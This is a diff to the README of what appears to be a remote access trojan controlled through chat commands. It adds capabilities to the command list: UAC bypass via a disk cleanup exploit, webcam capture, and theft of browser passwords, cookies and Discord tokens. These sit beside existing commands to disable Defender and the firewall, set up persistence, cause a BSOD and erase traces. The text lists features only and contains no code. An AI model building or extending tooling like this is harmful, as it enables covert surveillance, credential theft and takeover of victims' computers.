@@ -21,7 +21,7 @@ Here are the list of commands available:
 !whoami - shows the username of the current user
 !message hi - shows a message box with the text 'hi'
 !privs - shows the privilege level of the program
-!uac - elevate uac to gain admin privileges
+!uac - elevate uac to gain admin privileges using silent disk cleanup exploit
 !cd C:\ - change the working directory of the program
 !dir - shows all items in the current directory
 !download *file* - downloads the attached file from the computer
@@ -35,13 +35,15 @@ Here are the list of commands available:
 !block - blocks the computer's keyboard and mouse inputs but only if the program is running with admin privileges
 !unblock - unblocks the computer's keyboard and mouse inputs but only if the program is running with admin privileges
 !screenshot - takes a screenshot of the computer
-!exit - kills the current running process (end the connection)
+!webcam - takes a photo of from the webcam
+!close - kills the current running process (end the connection)
 !uninstall - kills the current running process and deletes all traces of itself from the computer (clean computer)
 !shutdown - shut down the computer
 !restart - restart the computer
 !logoff - log off the current user
 !lock - lock the computer
 !BSOD - cause a blue screen on the computer but only if the program is running with admin privileges
+!plist - lists all running processes
 !pkill processname - kills the specified process
 !defender = Disable windows defender
 !firewall = Disable windows firewall
@@ -51,4 +53,8 @@ Here are the list of commands available:
 !website url - open a website on the computer
 !startup - create a scheduled task to run the program on startup with admin privileges if possible or as a normal user
 !geolocate - get the coordinates of the users IP and the computers built in geolocation
+!password - recover passwords from MSedge, Chrome, Firefox, Brave, OperaGX (W.I.P)
+!cookie - recover cookies from MSedge, Chrome, Firefox, Brave, OperaGX (W.I.P)
+!token - recover discord tokens from discord, canary and web sessions (W.I.P)
+!help - list all commands
 ```
